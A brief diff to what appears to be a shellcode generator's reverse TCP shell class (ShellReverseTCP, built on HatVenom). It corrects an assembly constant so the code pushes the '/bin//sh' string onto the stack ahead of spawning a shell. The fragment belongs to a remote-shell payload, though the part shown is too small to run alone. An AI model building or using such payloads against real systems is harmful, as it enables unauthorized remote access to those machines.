@@ -80,7 +80,7 @@ class ShellReverseTCP(HatVenom):
             mov rax, r8
 
             xor rdx, rdx
-            mov r13, 0x68732f6e69622fff
+            mov r13, 0x68732f6e69622f2f
             shr r13, 8
             push r13
             mov rdi, rsp
